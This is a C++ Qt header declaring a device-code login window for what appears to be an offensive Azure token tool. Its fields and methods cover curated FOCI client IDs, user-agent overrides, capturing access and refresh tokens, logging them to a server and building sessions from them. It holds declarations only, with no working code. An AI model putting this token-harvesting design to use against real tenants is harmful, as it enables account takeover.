#pragma once
#include <QWidget>
#include <QLineEdit>
#include <QComboBox>
#include <QVBoxLayout>
#include <QTextBrowser>
#include <QPushButton>
#include <QCheckBox>
#include <QMap>

class DashboardWindow;

class DeviceCodeLoginWindow : public QWidget {
    Q_OBJECT
public:
    explicit DeviceCodeLoginWindow(DashboardWindow *dashboard = nullptr, QWidget *parent = nullptr);

private slots:
    void performDeviceCodeLogin();
    void handleResult(const QString &labelId, const QVariantMap &result);
    void handleError(const QString &labelId, const QString &message);

private:
    DashboardWindow *parentDashboard;
    QComboBox *clientId;               // editable combo: curated FOCI IDs + free-text
    QLineEdit *resourceInput;
    QLineEdit *additionalScopesInput;
    QLineEdit *uaInput;
    QCheckBox *createSessionCheckbox;
    QCheckBox *fullServerSessionCheckbox;   // server-side Connect-AzAccount full session
    QVBoxLayout *statusArea;

    struct StatusWidget {
        QTextBrowser *label;
        QWidget *wrapper;
        QPushButton *copyBtn;
        QString userCode;
    };

    QMap<QString, StatusWidget> statusWidgets;

    // Pending session creation state
    QString pendingRid;
    QString pendingAccessToken;
    QString pendingRefreshToken;
    QString pendingResource;
    bool hookConnected = false;
    bool sessionHandled = false;

    // Full server-session (device code runs inside Az on the server) state
    bool fullSessionMode = false;
    QString fullSessionSid;

    void startFullServerSession();
    void createStatusWidget(const QString &labelId);
    void logTokenToServer(const QString &accessToken, const QString &refreshToken, const QString &scope);
    void createSessionFromToken(const QString &accessToken, const QString &refreshToken, const QString &resource);
    void wireTransport();
    QObject* locateTransport() const;
};
